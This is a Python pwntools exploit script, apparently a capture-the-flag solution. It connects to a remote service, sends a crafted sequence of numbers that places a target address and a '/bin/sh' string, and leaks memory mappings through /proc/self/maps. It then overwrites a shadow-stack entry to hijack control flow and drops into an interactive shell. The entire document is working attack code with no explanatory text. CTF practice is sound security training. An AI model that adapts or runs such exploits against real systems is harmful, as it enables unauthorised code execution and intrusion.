#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from pwn import *

context.log_level = "info"
context.arch = "amd64"

io = remote("202.38.93.141", 31337)

PLACEHOLDER = 0xDEADBEEFCAFE
BIN_SH = u64(b"/bin/sh\x00")
TARGET_ADDR = 0x0000000000401913

send_num = lambda x: io.sendline(b"+" if x == PLACEHOLDER else str(x).encode())
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))


io.recvline()
io.sendline(input("Input your token: ").encode())

payload = [
    PLACEHOLDER,
    PLACEHOLDER,
    PLACEHOLDER,
    PLACEHOLDER,
    PLACEHOLDER,
    TARGET_ADDR,
    PLACEHOLDER,
    PLACEHOLDER,
    BIN_SH,
    0x31337,
]
io.recvuntil(b"Please share your lucky number.\n")

for i in payload:
    send_num(i)

io.recvuntil(b"\tEnter a filename: ")
io.sendline(b"/proc/self/maps")
leaks = io.recvuntil(b"linker").decode().split("\n")
shstk_addr = int(leaks[-2].split("-")[0], 16) + 0x2FD8
lg("shstk_addr", shstk_addr)
io.recvuntil(b"\tEnter the address: ")
io.sendline(str(shstk_addr).encode())
io.recvuntil(b"\tEnter the data: ")
io.sendline(str(0x0000000000401913).encode())

io.interactive()
